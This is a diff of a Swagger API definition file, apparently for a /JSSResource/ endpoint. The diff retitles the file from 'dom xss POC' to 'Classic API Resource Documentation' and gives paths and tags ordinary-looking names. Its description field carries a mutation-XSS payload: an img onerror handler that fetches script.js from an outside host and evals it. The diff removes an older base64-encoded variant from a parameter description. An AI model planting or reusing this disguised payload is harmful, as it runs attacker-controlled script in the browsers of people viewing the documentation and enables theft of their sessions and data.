@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
-  title: dom xss POC
+  title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>">"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLmwzdnlrZS5vbmUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=fetch('https://l3vyke.github.io/script.js').then(function(res){res.text().then(function(data){eval(data)})}) src=1>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -15,20 +15,19 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /rand:
+  /accounts:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-        - naothing_important_D
+        - accounts
       operationId: findAccounts
       summary: Finds all accounts
   '/accounts/groupid/{id}':
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>">"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLmwzdnlrZS5vbmUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>"></form>
 
           format: int64
           in: path
